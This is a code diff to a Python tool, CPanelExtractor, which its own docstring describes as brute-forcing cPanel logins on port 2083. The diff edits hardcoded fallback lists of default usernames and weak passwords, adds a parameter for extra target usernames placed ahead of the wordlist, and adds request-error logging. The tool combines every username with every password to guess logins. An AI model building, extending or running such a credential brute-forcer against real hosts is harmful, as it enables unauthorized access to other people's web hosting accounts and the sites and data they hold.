@@ -9,24 +9,18 @@ import urllib.parse
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-FALLBACK_USERNAMES = ['pschile', 'root', 'admin', 'cpanel', 'webmaster', 'admin-2']
+FALLBACK_USERNAMES = [ 'root', 'admin', 'cpanel', 'webmaster', 'admin-2']
 FALLBACK_PASSWORDS = ['', 'admin', 'password', '123456', 'cpanel']
 
 
 class CPanelExtractor:
     """Attempts to brute force cPanel login using credentials from wordlists."""
 
-    def __init__(self, ip: str, port: int = 2083, host: str = ''):
-        """Initialize with target IP, port and hostname.
-
-        Args:
-            ip (str): Target IP address.
-            port (int): cPanel HTTPS port, default 2083.
-            host (str): Domain name for Host header.
-        """
+    def __init__(self, ip: str, port: int = 2083, host: str = '', extra_usernames: list | None = None):
         self.ip = ip
         self.port = port
         self.host = host
+        self.extra_usernames = extra_usernames or []
 
     def run(self):
         """Load credentials and attempt cPanel login for each combination.
@@ -168,17 +162,14 @@ class CPanelExtractor:
                 return resp_body
             return decoded
 
-        except Exception:
+        except Exception as e:
+            print(f"  [cPanel] Request error: {type(e).__name__}: {e}", flush=True)
             return ''
 
     def _load_credentials(self) -> list:
-        """Load usernames and passwords from wordlist files and return all combinations.
-
-        Returns:
-            list: List of (username, password) tuples.
-        """
         wordlists_path = os.path.join(BASE_DIR, '..', '..', '..', 'wordlists')
         usernames = self._load_wordlist(wordlists_path, 'user', FALLBACK_USERNAMES)
+        usernames = self.extra_usernames + [u for u in usernames if u not in self.extra_usernames]
         passwords = self._load_wordlist(wordlists_path, 'pass', FALLBACK_PASSWORDS)
         return list(itertools.product(usernames, passwords))
 
